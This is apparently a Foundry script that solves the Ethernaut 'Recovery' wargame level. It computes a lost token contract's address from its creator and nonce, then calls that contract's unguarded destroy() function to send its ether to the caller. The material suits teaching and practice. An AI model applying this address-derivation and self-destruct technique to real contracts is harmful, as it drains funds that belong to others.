
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console} from "forge-std/Script.sol";

interface SimpleToken
{
    function destroy(address payable _to) external;
}
contract RecoverySolution is Script
{
    function run () external
    {
        vm.startBroadcast();
        address simpleTokenAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6),  // RLP: list of 2 items
            bytes1(0x94),  // RLP: 20-byte address follows
            0x50d5eDEC76E6f834042eFC9cb39d08920fd23b84,
            bytes1(0x01)   // RLP: nonce = 1
        )))));
        SimpleToken(simpleTokenAddress).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }

}
